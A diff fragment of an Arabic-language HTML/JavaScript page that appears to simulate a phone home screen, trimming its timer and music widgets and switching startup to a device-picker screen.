 el.querySelector('#dc2').onclick=()=>{ctx.fillStyle='#fff';ctx.fillRect(0,0,cv.width,cv.height)};
 el.querySelector('#dc3').onclick=()=>dl(cv.toDataURL('image/png'),'رسمتي.png');
 }
-/* المؤقت */
 function buildTimer(el,w){
-el.innerHTML='<div class="sw" style="margin-top:20px"><div class="swd" id="td">05:00</div><div class="swb"><button class="gbtn" data-m="1">1 دقيقة</button><button class="gbtn" data-m="5">5 دقائق</button><button class="gbtn" data-m="10">10 دقائق</button></div><div class="swb"><button class="pbtn2" id="tst">بدء</button><button class="gbtn" id="trs">إيقاف</button></div><div class="brhint" id="tmsg"></div></div>';
+el.innerHTML='<div class="sw" style="margin-top:20px"><div class="swd" id="td">05:00</div><div class="swb"><button class="gbtn" data-m="1">1 دقيقة</button><button class="gbtn" data-m="5">5 دقائق</button><button class="gbtn" data-m="10">10 دقائق</button></div><div class="swb"><button class="pbtn2" id="tst">بدء</button><button class="gbtn" id="trs">إيقاف</button></div></div>';
 let left=300,iv=null;
 const show=()=>el.querySelector('#td').textContent=String(Math.floor(left/60)).padStart(2,'0')+':'+String(left%60).padStart(2,'0');
 el.querySelectorAll('[data-m]').forEach(b=>b.addEventListener('click',()=>{left=+b.dataset.m*60;show()}));
 el.querySelector('#tst').addEventListener('click',()=>{
 if(iv)return;
-iv=setInterval(()=>{
-if(left>0){left--;show()}
-if(left===0){clearInterval(iv);iv=null;el.querySelector('#tmsg').textContent='انتهى الوقت ⏰';try{navigator.vibrate&&navigator.vibrate(300)}catch(e){}}
-},1000);
+iv=setInterval(()=>{if(left>0){left--;show()}if(left===0){clearInterval(iv);iv=null}},1000);
 });
 el.querySelector('#trs').addEventListener('click',()=>{clearInterval(iv);iv=null});
 const old=w._kill;w._kill=()=>{clearInterval(iv);old&&old()};
 show();
 }
-/* الموسيقى */
 function buildMusic(el,w){
 w._tr=w._tr||[];
-el.innerHTML='<div class="dz"><div style="font-size:34px">🎵</div><div>اضغط لاختيار ملفات صوتية من جهازك</div><input type="file" accept="audio/*" multiple hidden></div><div class="flist"></div><audio id="ma" controls></audio>';
+el.innerHTML='<div class="dz"><div style="font-size:34px">🎵</div><div>اضغط لاختيار ملفات صوتية</div><input type="file" accept="audio/*" multiple hidden></div><div class="flist"></div><audio id="ma" controls></audio>';
 const dz=el.children[0],min=dz.querySelector('input'),list=el.children[1],au=el.querySelector('#ma');
 const render=()=>list.innerHTML=w._tr.length?w._tr.map((t,i)=>'<div class="frow"><div class="fic">🎵</div><div class="fmeta"><div class="fn">'+esc(t.name)+'</div></div><button class="gbtn" data-p="'+i+'">▶</button></div>').join(''):'<div class="empty">لا توجد مقاطع</div>';
 dz.addEventListener('click',()=>min.click());
@@ -631,6 +717,7 @@ min.addEventListener('change',()=>{[...min.files].forEach(f=>w._tr.push({name:f.
 list.addEventListener('click',e=>{const i=e.target.dataset.p;if(i!==undefined){au.src=w._tr[i].url;au.play()}});
 render();
 }
+
 def('gallery','المعرض','https://cdn-icons-png.flaticon.com/128/8418/8418513.png','linear-gradient(135deg,#f6d365,#fda085)',buildGallery);
 def('files','الملفات','https://cdn-icons-png.flaticon.com/128/1379/1379905.png','linear-gradient(135deg,#89f7fe,#66a6ff)',buildFiles);
 def('notes','جهات الاتصال','https://cdn-icons-png.flaticon.com/128/17580/17580748.png','linear-gradient(135deg,#fbc2eb,#a6c1ee)',buildNotes);
@@ -643,10 +730,13 @@ def('units','التحويل','📐','linear-gradient(135deg,#fddb92,#d1fdff)',bu
 def('draw','الرسم','🎨','linear-gradient(135deg,#ff9a9e,#fecfef)',buildDraw);
 def('timer','المؤقت','⏳','linear-gradient(135deg,#f093fb,#f5576c)',buildTimer);
 def('music','الموسيقى','https://cdn-icons-png.flaticon.com/128/16076/16076080.png','linear-gradient(135deg,#4facfe,#00f2fe)',buildMusic);
+
 pages.innerHTML='<div class="pg"><div class="wgt"><div id="wclk"></div><div id="wdat"></div></div>'+P1.map(icHTML).join('')+'</div><div class="pg">'+P2.map(icHTML).join('')+'</div>';
 dock.innerHTML=DK.map(icHTML).join('');
 setPage(0,false);
-tick();
+
+// ⭐ ابدأ بشاشة اختيار الجهاز
+showDevicePicker();
 </script>
 </body>
 </html>
